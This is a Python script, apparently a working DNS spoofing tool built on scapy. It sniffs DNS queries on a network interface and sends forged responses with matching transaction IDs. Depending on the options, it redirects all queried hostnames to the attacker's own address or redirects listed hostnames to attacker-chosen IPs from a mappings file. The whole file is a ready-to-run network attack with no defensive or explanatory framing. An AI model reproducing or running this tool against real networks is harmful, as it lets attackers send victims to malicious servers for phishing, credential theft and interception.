from scapy.all import sniff, IP, UDP, DNS, DNSRR, DNSQR, send, get_if_addr
import sys
import pprint

def inject(pkt): 

    ip = pkt.getlayer(IP)
    dns = pkt.getlayer(DNS)

    url = dns.qd.qname

    if url in mappings or hostname == "all": 

        if dns.qr or not ip: 
            return

        print("Recieved: " + str(url))
 
        forged_ip = IP(dst=ip.src, src=ip.dst )
        forged_udp = UDP(dport=ip.sport,sport=ip.dport)

        forged_dns_qd = DNSQR(qtype="A", qname=url) 
        forged_dns_an = DNSRR(rrname = url, ttl = 123, rdata= get_if_addr(interface) if hostname == "all" else mappings[url])

        forged_dns = DNS(id=dns.id,rd = 1, qr = 1, ra = 1, qd=forged_dns_qd,an=forged_dns_an)

        send(forged_ip / forged_udp / forged_dns, iface= interface)


if __name__ == "__main__": 

    print("Injector Running....")

    interface      = "Wi-Fi"
    hostname       =  None 
    mappings = {} 


    if "-i" in sys.argv: interface = sys.argv[sys.argv.index("-i") + 1]
    if "-h" in sys.argv: 
        hostname =  sys.argv[sys.argv.index("-h") + 1]
        with open(hostname, "r") as urlMappings: 

            while True: 

                line = urlMappings.readline()

                if not line: break 

                ip, url = line.split(",")
                
                url = bytes(url.strip() + ".", "utf-8")

                mappings[url] = bytes(ip, "utf-8")

    else: 
        hostname = "all"

    
    dnsfilter = "port 53"

    print("Mappings: ")
    pprint.pprint(mappings)
    print("Listening on: " + interface)

    pkts = sniff(iface=interface, filter= dnsfilter, prn=lambda x: inject(x))